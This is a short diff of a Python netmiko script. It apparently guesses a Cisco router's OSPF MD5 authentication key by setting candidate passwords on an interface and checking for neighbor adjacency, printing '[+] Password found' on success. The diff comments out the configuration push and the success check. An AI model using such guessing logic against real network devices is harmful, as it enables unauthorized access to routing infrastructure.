@@ -25,13 +25,13 @@ with ConnectHandler(**cisco_device) as net_connect:
             f'ip ospf message-digest-key 1 md5 {ospf_password}',
             "ip ospf authentication message-digest"
         ]
-        output = net_connect.send_config_set(commands)
-        print(output)
-        sleep(5)
+     #   output = net_connect.send_config_set(commands)
+      #  print(output)
+      #  sleep(5)
         output = net_connect.send_command('show ip ospf neighb')
         print(output)
-        if output[len(output) - 1] !="#":
-            print(f"[+] Password found: {ospf_password}")
-            break
-        else:
-            print(f"[-] Password not found, try again")
+     #   if output[len(output) - 1] !="#":
+     #       print(f"[+] Password found: {ospf_password}")
+     #       break
+     #   else:
+       #     print(f"[-] Password not found, try again")
